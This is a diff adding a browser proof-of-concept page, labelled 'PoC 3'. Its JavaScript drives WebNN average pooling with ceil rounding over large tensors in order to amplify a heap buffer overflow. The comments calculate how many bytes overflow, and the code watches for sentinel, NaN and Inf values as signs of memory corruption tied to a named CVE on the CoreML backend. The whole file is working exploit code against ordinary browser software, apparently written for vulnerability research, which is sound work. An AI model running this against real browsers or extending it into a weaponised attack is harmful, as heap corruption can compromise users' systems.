@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html>
+<head><title>WebNN pool2d ceil rounding - Large Tensors</title></head>
+<body>
+<h2>WebNN pool2d ceil rounding - Large Tensors (Heap Overflow Amplification)</h2>
+<pre id="output"></pre>
+<script>
+const log = (msg) => {
+  console.log(msg);
+  document.getElementById('output').textContent += msg + '\n';
+};
+
+async function testLargeTensors() {
+  log('=== PoC 3: Large tensors to amplify buffer overflow ===');
+  log('');
+
+  if (!navigator.ml) {
+    log('ERROR: WebNN API not available');
+    return;
+  }
+
+  let context;
+  try {
+    context = await navigator.ml.createContext({ deviceType: 'gpu' });
+    log('Using GPU/CoreML backend');
+  } catch(e) {
+    try {
+      context = await navigator.ml.createContext({ deviceType: 'cpu' });
+      log('Using CPU backend');
+    } catch(e2) {
+      log('No context: ' + e2.message);
+      return;
+    }
+  }
+
+  // Large tensor with maximum floor/ceil discrepancy
+  // Input: [1, 64, 113, 113] with stride 2, window 3
+  // Floor: floor((113-3)/2) + 1 = 56, Ceil: ceil((113-3)/2) + 1 = 56 → no diff
+  // Input: [1, 64, 115, 115] with stride 2, window 2
+  // Floor: floor((115-2)/2) + 1 = 57, Ceil: ceil((115-2)/2) + 1 = 58 → DIFF
+  // Overflow per channel: (58*58 - 57*57) * 4 = (3364 - 3249) * 4 = 460 bytes
+  // With 64 channels: 460 * 64 = 29,440 bytes heap overflow!
+
+  const testCases = [
+    {
+      name: 'Medium tensor (64ch, 115x115)',
+      shape: [1, 64, 115, 115],
+      window: [2, 2],
+      stride: [2, 2],
+    },
+    {
+      name: 'Large tensor (128ch, 227x227)',
+      shape: [1, 128, 227, 227],
+      window: [2, 2],
+      stride: [2, 2],
+    },
+    {
+      name: 'Extreme stride discrepancy (1ch, 1001x1001)',
+      shape: [1, 1, 1001, 1001],
+      window: [3, 3],
+      stride: [2, 2],
+    },
+    {
+      name: 'Multi-batch (4, 32, 63, 63)',
+      shape: [4, 32, 63, 63],
+      window: [2, 2],
+      stride: [2, 2],
+    },
+  ];
+
+  for (const tc of testCases) {
+    const [n, c, h, w] = tc.shape;
+    const [wh, ww] = tc.window;
+    const [sh, sw] = tc.stride;
+
+    const floorH = Math.floor((h - wh) / sh) + 1;
+    const floorW = Math.floor((w - ww) / sw) + 1;
+    const ceilH = Math.ceil((h - wh) / sh) + 1;
+    const ceilW = Math.ceil((w - ww) / sw) + 1;
+
+    const floorSize = n * c * floorH * floorW;
+    const ceilSize = n * c * ceilH * ceilW;
+    const overflowBytes = (ceilSize - floorSize) * 4;
+
+    log(`--- ${tc.name} ---`);
+    log(`  Input: [${tc.shape}], Window: [${tc.window}], Stride: [${tc.stride}]`);
+    log(`  Floor output: [${n},${c},${floorH},${floorW}] = ${floorSize} elements`);
+    log(`  Ceil output:  [${n},${c},${ceilH},${ceilW}] = ${ceilSize} elements`);
+    log(`  Potential overflow: ${overflowBytes} bytes`);
+
+    if (overflowBytes === 0) {
+      log('  No discrepancy, skipping');
+      log('');
+      continue;
+    }
+
+    const inputSize = n * c * h * w;
+    if (inputSize > 50000000) {
+      log('  Input too large (' + inputSize + ' elements), reducing...');
+      log('');
+      continue;
+    }
+
+    try {
+      const builder = new MLGraphBuilder(context);
+      const input = builder.input('input', { dataType: 'float32', shape: tc.shape });
+
+      const avgPool = builder.averagePool2d(input, {
+        windowDimensions: tc.window,
+        strides: tc.stride,
+        padding: [0, 0, 0, 0],
+        roundingType: 'ceil',
+        layout: 'nchw'
+      });
+
+      log('  Building graph...');
+      const graph = await builder.build({ 'out': avgPool });
+      log('  Graph built');
+
+      const inputData = new Float32Array(inputSize);
+      // Fill with recognizable pattern
+      for (let i = 0; i < inputSize; i++) inputData[i] = (i % 256) * 0.01;
+
+      const outputBuffer = new Float32Array(ceilSize);
+      // Pre-fill with sentinel value
+      outputBuffer.fill(-999.0);
+
+      log('  Computing...');
+      const results = await context.compute(graph, { 'input': inputData }, { 'out': outputBuffer });
+      log('  Compute done');
+
+      const output = results.outputs.out || outputBuffer;
+
+      // Check how many sentinel values remain (should be 0 if ceil rounding correct)
+      let sentinelCount = 0;
+      let nanCount = 0;
+      let infCount = 0;
+      let negCount = 0;
+      for (let i = 0; i < output.length; i++) {
+        if (output[i] === -999.0) sentinelCount++;
+        if (isNaN(output[i])) nanCount++;
+        if (!isFinite(output[i])) infCount++;
+        if (output[i] < 0 && output[i] !== -999.0) negCount++;
+      }
+
+      log(`  Output length: ${output.length}`);
+      log(`  Sentinel (-999) remaining: ${sentinelCount}/${ceilSize}`);
+      log(`  NaN count: ${nanCount}`);
+      log(`  Inf count: ${infCount}`);
+      log(`  Unexpected negatives: ${negCount}`);
+
+      // Sample first and last 10 values
+      const first10 = Array.from(output.slice(0, 10)).map(v => v.toFixed(4));
+      const last10 = Array.from(output.slice(-10)).map(v => v.toFixed(4));
+      log(`  First 10: ${first10.join(', ')}`);
+      log(`  Last 10: ${last10.join(', ')}`);
+
+      // Check the boundary region (where floor output ends and ceil-only region begins)
+      const boundaryStart = floorSize - 5;
+      const boundaryEnd = Math.min(floorSize + 5, ceilSize);
+      const boundaryVals = Array.from(output.slice(boundaryStart, boundaryEnd)).map(v => v.toFixed(4));
+      log(`  Boundary region [${boundaryStart}..${boundaryEnd}]: ${boundaryVals.join(', ')}`);
+
+      if (sentinelCount > 0) {
+        log(`  *** ${sentinelCount} SENTINEL VALUES REMAIN - output not fully written ***`);
+        log(`  *** CoreML computed floor-sized output into ceil-sized buffer ***`);
+        log(`  *** This is the CVE-2026-3915 pattern on CoreML backend! ***`);
+      }
+
+      if (nanCount > 0 || infCount > 0) {
+        log(`  *** MEMORY CORRUPTION INDICATORS: NaN=${nanCount}, Inf=${infCount} ***`);
+      }
+
+    } catch(e) {
+      log(`  ERROR: ${e.message}`);
+      if (e.message.includes('crash') || e.message.includes('lost') || e.message.includes('destroyed')) {
+        log(`  *** CRASH DETECTED - likely heap corruption! ***`);
+      }
+    }
+
+    log('');
+  }
+
+  log('=== PoC 3 Complete ===');
+}
+
+testLargeTensors();
+</script>
+</body>
+</html>
